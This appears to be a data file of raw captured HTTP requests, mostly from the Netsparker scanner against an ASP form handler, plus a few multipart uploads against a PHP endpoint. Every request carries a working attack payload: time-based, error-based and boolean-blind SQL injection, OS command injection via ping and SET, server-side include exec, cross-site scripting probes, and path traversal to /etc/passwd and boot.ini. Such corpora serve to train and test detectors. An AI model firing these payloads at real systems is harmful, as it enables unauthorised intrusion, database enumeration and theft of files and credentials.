name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=1)%3bDECLARE%2f**%2f%40x%2f**%2fchar(9)%3bSET%2f**%2f%40x%3dchar(48)%2bchar(58)%2bchar(48)%2bchar(58)%2bchar(50)%2bchar(53)%3bWAITFOR%2f**%2fDELAY%2f**%2f%40x--&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 424
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=-1+AND+(SELECT+1+FROM+(SELECT+2)a+WHERE+1%3dsleep(25))--+1&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 389
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=(select+sleep(25))a--+1&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 336
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%26ping+-c+25+127.0.0.1+%26&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 482
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=%2527%2522--%253E%253C%252Fstyle%253E%253C%252FscRipt%253E%253CscRipt%253Enetsparker%25280x003D14%2529%253C%252FscRipt%253E&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 333
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=ping+-c+25+127.0.0.1+%26&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 562
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=(select+dbms_pipe.receive_message((chr(95)%7c%7cchr(33)%7c%7cchr(64)%7c%7cchr(51)%7c%7cchr(100)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(101)%7c%7cchr(109)%7c%7cchr(109)%7c%7cchr(97))%2c25)+from+dual)&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 455
Accept-Encoding: gzip, deflate

name=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 379
Accept-Encoding: gzip, deflate

name=%2fetc%2fpasswd&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 358
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%3c!--%23exec+cmd%3d%22expr+268409241+-+2%22--%3e&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 405
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=%27%3e%3cnet+sparker%3dnetsparker(0x003D1A)%3e&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 398
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=%3cscRipt%3ens(0x003D1D)%3c%2fscRipt%3e&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 405
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=%22%3e%3cnet+sparker%3dnetsparker(0x003D1B)%3e&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 403
Accept-Encoding: gzip, deflate

name=data%3a%3bbase64%2cTlM3NzU0NTYxNDQ2NTc1&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 333
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=SET+%2fA+0xFFF9999-2+%26&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 392
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=1)%3bSELECT+pg_sleep(25)--&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 565
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=%27%7c%7cCTXSYS.DRITHSX.SN(user%2c(select+chr(95)%7c%7cchr(33)%7c%7cchr(64)%7c%7cchr(51)%7c%7cchr(100)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(101)%7c%7cchr(109)%7c%7cchr(109)%7c%7cchr(97)+from+DUAL))%7c%7c%27&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 398
Accept-Encoding: gzip, deflate

name=Smith&sex=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fboot.ini%00.asp&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 344
Accept-Encoding: gzip, deflate

name=Smith&sex=r87.com%2fn&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 488
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=5234534558&email=%27AND+1%3d(CHAR(95)%2bCHAR(33)%2bCHAR(64)%2bCHAR(50)%2bCHAR(100)%2bCHAR(105)%2bCHAR(108)%2bCHAR(101)%2bCHAR(109)%2bCHAR(109)%2bCHAR(97))%2b%27&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/savehf.asp HTTP/1.1
Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.170 Safari/537.36 Netsparker
Cache-Control: no-cache
Accept-Language: en-us,en;q=0.5
X-Scanner: Netsparker
Content-Type: application/x-www-form-urlencoded
Content-Length: 385
Accept-Encoding: gzip, deflate

name=Smith&sex=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd&xxid=286&xxtime=2010-5-10+13%3a51%3a10&xxts=182&xxmem=70&tel=%0anetsparker(0x003D26)%3b&email=netsparker%40example.com&tit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%d4%a3%ef%bf%bdtrrrrrrrrtrtrtrtrtrtrdv&Submit=%ef%bf%bd%ef%bf%bd%ef%bf%bd%cf%b7%ef%bf%bd%ef%bf%bd%ef%bf%bd&Reset=%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%ef%bf%bd%d0%b4&neirong=3"
"/index.php?r=users%2Ffile HTTP/1.1
Content-Length: 914
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------110737469915532811911185764205

-----------------------------110737469915532811911185764205
Content-Disposition: form-data; name=""_csrf""

VyyqD2RSz1CYWhHHR5JDOPtGuJKI2Ix6B3cH42bj4-g-AZ1WHAWZY90IdbJ2oHVgqTH_-aWv9UxtKDeiB6HRvA==
-----------------------------110737469915532811911185764205
Content-Disposition: form-data; name=""UploadForm[name]""

2' where 1=(SELECT (CASE WHEN (ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),5,1))>96) THEN 5101 ELSE 5101*(SELECT 5101 FROM INFORMATION_SCHEMA.PLUGINS) END)) or sleep(1) -- 
-----------------------------110737469915532811911185764205
Content-Disposition: form-data; name=""UploadForm[imageFile]""


-----------------------------110737469915532811911185764205
Content-Disposition: form-data; name=""UploadForm[imageFile]""; filename=""test1.png""
Content-Type: image/png

PNG


-----------------------------110737469915532811911185764205--"
"/index.php?r=users%2Ffile HTTP/1.1
Content-Length: 915
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------110737469915532811911185764205

-----------------------------110737469915532811911185764205
Content-Disposition: form-data; name=""_csrf""

VyyqD2RSz1CYWhHHR5JDOPtGuJKI2Ix6B3cH42bj4-g-AZ1WHAWZY90IdbJ2oHVgqTH_-aWv9UxtKDeiB6HRvA==
-----------------------------110737469915532811911185764205
Content-Disposition: form-data; name=""UploadForm[name]""

2' where 1=(SELECT (CASE WHEN (ORD(MID((SELECT DISTINCT(IFNULL(CAST(schema_name AS CHAR),0x20)) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),7,1))>104) THEN 5101 ELSE 5101*(SELECT 5101 FROM INFORMATION_SCHEMA.PLUGINS) END)) or sleep(1) -- 
-----------------------------110737469915532811911185764205
Content-Disposition: form-data; name=""UploadForm[imageFile]""


-----------------------------110737469915532811911185764205
Content-Disposition: form-data; name=""UploadForm[imageFile]""; filename=""test1.png""
Content-Type: image/png

PNG


-----------------------------110737469915532811911185764205--"
"/index.php?r=users%2Ffile HTTP/1.1
Content-Length: 915
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
